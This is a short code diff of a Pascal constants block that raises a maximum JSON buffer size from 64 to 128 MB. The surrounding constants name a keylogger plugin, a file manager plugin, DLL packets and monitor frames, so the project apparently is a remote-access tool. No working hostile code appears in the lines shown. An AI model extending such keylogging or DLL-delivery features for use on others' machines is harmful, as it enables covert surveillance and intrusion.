@@ -24,7 +24,7 @@ const
   KEYLOGGER_PLUGIN_ID         = 'KeyloggerPlugin';
   OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
   FILE_MANAGER_PLUGIN_ID      = 'FileManagerPlugin';
-  MAX_JSON_BUFFER_SIZE        = 64 * 1024 * 1024;
+  MAX_JSON_BUFFER_SIZE        = 128 * 1024 * 1024;
   PACKET_TYPE_JSON            = $01;
   PACKET_TYPE_DLL             = $02;
   PACKET_TYPE_MONITOR_FRAME   = $03;
